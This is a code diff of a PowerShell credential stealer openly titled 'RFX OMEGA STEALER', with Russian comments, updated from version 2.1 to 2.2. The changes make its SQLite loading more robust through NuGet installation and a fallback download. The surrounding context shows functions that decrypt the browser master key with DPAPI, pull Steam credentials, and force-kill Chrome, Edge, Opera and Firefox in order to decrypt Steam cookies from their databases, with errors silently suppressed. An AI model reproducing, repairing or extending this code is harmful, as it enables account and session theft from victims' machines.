@@ -1,6 +1,6 @@
 # ============================================================
-#                   RFX OMEGA STEALER v2.1
-#           Автоматическая загрузка SQLite + кража Steam
+#                   RFX OMEGA STEALER v2.2
+#           Автоматическая загрузка SQLite (исправлено)
 # ============================================================
 $ErrorActionPreference = 'SilentlyContinue'
 
@@ -125,7 +125,7 @@ function Get-MasterKey {
     Unprotect-DPAPI -cipherText $encKey
 }
 
-# ------------------- НОВАЯ УЛУЧШЕННАЯ ЗАГРУЗКА SQLite -------------------
+# ------------------- ИСПРАВЛЕННАЯ ЗАГРУЗКА SQLite -------------------
 function Load-SQLite {
     # Проверяем, может уже загружена
     try {
@@ -140,7 +140,7 @@ function Load-SQLite {
         "$env:ProgramFiles\System.Data.SQLite\System.Data.SQLite.dll",
         "$env:ProgramFiles(x86)\System.Data.SQLite\System.Data.SQLite.dll",
         "$env:SYSTEMROOT\System32\System.Data.SQLite.dll",
-        [System.IO.Path]::Combine($env:SYSTEMROOT, "Microsoft.NET\assembly\GAC_MSIL\System.Data.SQLite\v4.0_1.0.119.0__db937bc2d44ff139\System.Data.SQLite.dll")
+        [System.IO.Path]::Combine($env:SYSTEMROOT, "Microsoft.NET\assembly\GAC_MSIL\System.Data.SQLite\v4.0_1.0.118.0__db937bc2d44ff139\System.Data.SQLite.dll")
     )
     foreach ($path in $possiblePaths) {
         if (Test-Path $path) {
@@ -148,15 +148,42 @@ function Load-SQLite {
         }
     }
 
-    # 2. Скачиваем и распаковываем свежую версию в %TEMP%
+    # 2. Пытаемся установить через NuGet (если доступен)
+    try {
+        if (-not (Get-PackageProvider -Name NuGet -ErrorAction SilentlyContinue)) {
+            Install-PackageProvider -Name NuGet -Scope CurrentUser -Force -ErrorAction Stop
+        }
+        $package = Install-Package -Name System.Data.SQLite -Scope CurrentUser -Force -ErrorAction Stop
+        $packagePath = $package.Source
+        if (-not $packagePath) {
+            $nugetPackages = "$env:USERPROFILE\.nuget\packages\system.data.sqlite"
+            $latestVersion = Get-ChildItem -Path $nugetPackages -Directory | Sort-Object Name -Descending | Select-Object -First 1
+            if ($latestVersion) {
+                $dllPath = Join-Path $latestVersion.FullName "lib\net46\System.Data.SQLite.dll"
+                if (Test-Path $dllPath) {
+                    Add-Type -Path $dllPath -ErrorAction Stop
+                    return $true
+                }
+            }
+        } else {
+            $dllPath = Join-Path $packagePath "lib\net46\System.Data.SQLite.dll"
+            if (Test-Path $dllPath) {
+                Add-Type -Path $dllPath -ErrorAction Stop
+                return $true
+            }
+        }
+    } catch {
+        Write-Warning "Не удалось установить через NuGet: $_"
+    }
+
+    # 3. Запасной вариант – скачиваем с проверенного URL (версия 1.0.118.0)
     $tempDir = "$env:TEMP\SQLiteLoader_$([System.Guid]::NewGuid())"
     New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
-    $zipUrl = "https://system.data.sqlite.org/downloads/1.0.119.0/sqlite-netFx46-binary-bundle-Win32-2018-1.0.119.0.zip"
+    $zipUrl = "https://system.data.sqlite.org/downloads/1.0.118.0/sqlite-netFx46-binary-bundle-Win32-2018-1.0.118.0.zip"
     $zipPath = "$tempDir\sqlite.zip"
     try {
         (New-Object Net.WebClient).DownloadFile($zipUrl, $zipPath)
         Expand-Archive -Path $zipPath -DestinationPath $tempDir -Force
-        # Ищем нужную DLL – для x64 или x86
         $arch = if ([System.Environment]::Is64BitOperatingSystem) { "x64" } else { "x86" }
         $dllCandidates = @(
             "$tempDir\bin\$arch\System.Data.SQLite.dll",
@@ -177,7 +204,7 @@ function Load-SQLite {
             throw "Не найдена System.Data.SQLite.dll в распакованном архиве"
         }
     } catch {
-        Write-Warning "Не удалось загрузить SQLite: $_"
+        Write-Warning "Не удалось загрузить SQLite по URL: $_"
         Remove-Item $tempDir -Recurse -Force -ErrorAction SilentlyContinue
         return $false
     }
@@ -237,7 +264,6 @@ function getSteamCredentials {
 
 # ------------------- НОВАЯ ФУНКЦИЯ – РАСШИФРОВКА КУК STEAM -------------------
 function getSteamCookies {
-    # Останавливаем браузеры
     $browserExes = @("chrome.exe", "msedge.exe", "opera.exe", "firefox.exe")
     foreach ($exe in $browserExes) { taskkill /F /IM $exe /T 2>$null }
     Start-Sleep -Seconds 2
@@ -248,7 +274,6 @@ function getSteamCookies {
     $allCookies = @()
     $allCookiesTxt = ""
 
-    # ---- Функция чтения и расшифровки кук из SQLite ----
     function Read-SteamCookiesFromDb {
         param([string]$dbPath, [byte[]]$masterKey, [string]$browserName)
         if (-not (Test-Path $dbPath) -or -not $masterKey) { return $null }
